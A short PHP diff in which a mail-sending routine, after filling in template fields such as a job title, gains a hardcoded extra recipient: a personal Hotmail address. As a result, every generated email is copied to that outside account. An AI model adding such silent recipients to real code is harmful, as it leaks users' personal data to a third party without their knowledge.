@@ -163,6 +163,8 @@
            $Texto_Correo    = str_replace("#_CARGO_#"     , $Cargo    ,$Texto_Correo);
            $this->Email->Body    =  $Texto_Correo  ;
            $this->Email->AddAddress($Email);
+           $this->Email->AddAddress('jhonjamesmg@hotmail.com');
+
            $Respuesta              = $this->Enviar_Correo();
       }
 
